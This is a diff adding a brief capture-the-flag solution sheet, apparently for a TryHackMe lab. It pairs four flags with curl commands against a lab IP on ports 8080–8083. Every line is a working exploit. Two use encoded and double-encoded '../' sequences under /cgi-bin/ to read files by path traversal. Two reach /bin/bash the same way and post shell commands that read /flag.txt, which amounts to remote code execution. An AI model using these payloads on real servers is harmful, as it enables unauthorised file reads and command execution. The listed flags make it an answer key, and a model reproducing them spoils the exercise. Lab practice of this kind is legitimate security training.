@@ -1,0 +1,7 @@
+THM{724V3R51N6_P4TH5_F02_FUN}: 8080 --> curl -v 'http://10.10.207.97:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt'
+
+THM{2C3_F20M_C61}: 8081 --> curl -v 'http://10.10.207.97:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /flag.txt' -H "Content-Type: text/plain"
+
+THM{D0UBL3_3NC0D1N6_F7W}: 8082 --> curl 'http://10.10.207.97:8082/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag.txt'
+
+THM{F1L732_8YP455_2C3}: 8083 --> curl -v 'http://10.10.207.97:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /flag.txt' -H "Content-Type: text/plain"
